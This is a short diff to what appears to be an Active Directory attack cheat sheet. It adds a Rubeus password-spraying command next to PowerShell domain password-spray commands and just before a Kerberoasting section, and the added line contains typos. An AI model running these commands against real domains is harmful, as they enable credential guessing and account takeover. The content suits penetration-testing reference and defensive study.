@@ -109,6 +109,10 @@ powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passl
 # Auto spray a specific password on an auto-generated user list (very noisy)
 powershell Invoke-DomainPasswordSpray -Password Winter2020
 ```
+Rubeus brute-force password spraying
+```
+execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE>] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
+```
 
 ### Kerberoasting
 PowerView kerberoasting
